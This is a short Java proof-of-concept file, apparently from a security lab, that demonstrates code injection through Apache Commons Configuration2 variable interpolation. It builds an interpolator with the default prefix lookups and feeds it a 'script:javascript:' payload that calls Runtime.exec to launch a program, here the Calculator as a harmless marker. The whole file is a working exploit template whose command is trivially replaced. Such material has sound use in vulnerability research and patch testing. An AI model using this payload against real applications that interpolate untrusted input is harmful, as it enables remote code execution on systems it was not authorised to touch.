package com.lab;

import org.apache.commons.configuration2.interpol.ConfigurationInterpolator;
import org.apache.commons.configuration2.interpol.InterpolatorSpecification;

public class Main {
 public static void main(String []args) {
   String poc = "${script:javascript:java.lang.Runtime.getRuntime().exec(\"open -na Calculator\")}";
   InterpolatorSpecification specification = new InterpolatorSpecification.Builder()
           .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups())
           .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values())
           .create();
   ConfigurationInterpolator interpolator = ConfigurationInterpolator.fromSpecification(specification);
   System.out.printf(interpolator.interpolate(poc).toString());
 }
}

